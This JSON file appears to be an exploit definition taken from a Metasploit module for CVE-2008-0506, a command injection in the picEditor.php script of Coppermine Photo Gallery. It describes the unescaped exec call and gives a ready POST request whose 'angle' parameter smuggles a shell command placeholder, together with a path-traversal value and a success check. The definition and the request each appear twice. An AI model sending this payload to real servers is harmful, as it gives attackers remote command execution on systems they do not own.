{
   "type" : "MSF",
   "platform" : "UNIX",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a vulnerability in the picEditor.php script of\n\n        Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to\n\n        use the ImageMagick library, the 'quality', 'angle', and 'clipval'\n\n        parameters are not properly escaped before being passed to the PHP\n\n        'exec' command.\n\n\n\n        In order to reach the vulnerable 'exec' call, the input must pass\n\n        several validation steps.\n\n\n\n        The vulnerabilities actually reside in the following functions:\n\n\n\n        image_processor.php: rotate_image(...)\n\n        include/imageObjectIM.class.php: imageObject::cropImage(...)\n\n        include/imageObjectIM.class.php: imageObject::rotateImage(...)\n\n        include/imageObjectIM.class.php: imageObject::resizeImage(...)\n\n        include/picmgmt.inc.php: resize_image(...)\n\n\n\n        NOTE: Use of the ImageMagick library is a non-default option. However, a\n\n        user can specify its use at installation time.\n\n      ",
   "title" : "Coppermine Photo Gallery picEditor.php Command Execution",
   "name" : "CopperminePiceditor",
   "cve" : "CVE-2008-0506",
   "msf_module" : "coppermine_piceditor",
   "references" : [
      "http://forum.coppermine-gallery.net/index.php?topic=50103.0"
   ],
   "requests" : {
      "EXPLOIT2" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /picEditor.php",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "angle=65094%20-quiet%201%202%3b__PAYLOAD__%3b%23&quality=50&newimage=../../images/thumb_private.jpg",
         "METHOD" : "POST",
         "PATH" : "picEditor.php"
      }
   },
   "osvdb" : 41676,
   "informations" : {
      "REFERENCES" : [
         "http://forum.coppermine-gallery.net/index.php?topic=50103.0"
      ],
      "PLATFORM" : "UNIX",
      "TYPE" : "MSF",
      "TITLE" : "Coppermine Photo Gallery picEditor.php Command Execution",
      "CVE" : "CVE-2008-0506",
      "OSVDB" : 41676,
      "name" : "CopperminePiceditor",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /picEditor.php",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "angle=65094%20-quiet%201%202%3b__PAYLOAD__%3b%23&quality=50&newimage=../../images/thumb_private.jpg",
            "METHOD" : "POST",
            "PATH" : "picEditor.php"
         }
      },
      "DESCRIPTION" : "\n\n        This module exploits a vulnerability in the picEditor.php script of\n\n        Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to\n\n        use the ImageMagick library, the 'quality', 'angle', and 'clipval'\n\n        parameters are not properly escaped before being passed to the PHP\n\n        'exec' command.\n\n\n\n        In order to reach the vulnerable 'exec' call, the input must pass\n\n        several validation steps.\n\n\n\n        The vulnerabilities actually reside in the following functions:\n\n\n\n        image_processor.php: rotate_image(...)\n\n        include/imageObjectIM.class.php: imageObject::cropImage(...)\n\n        include/imageObjectIM.class.php: imageObject::rotateImage(...)\n\n        include/imageObjectIM.class.php: imageObject::resizeImage(...)\n\n        include/picmgmt.inc.php: resize_image(...)\n\n\n\n        NOTE: Use of the ImageMagick library is a non-default option. However, a\n\n        user can specify its use at installation time.\n\n      ",
      "MSF_MODULE" : "coppermine_piceditor"
   },
   "detection" : {}
}
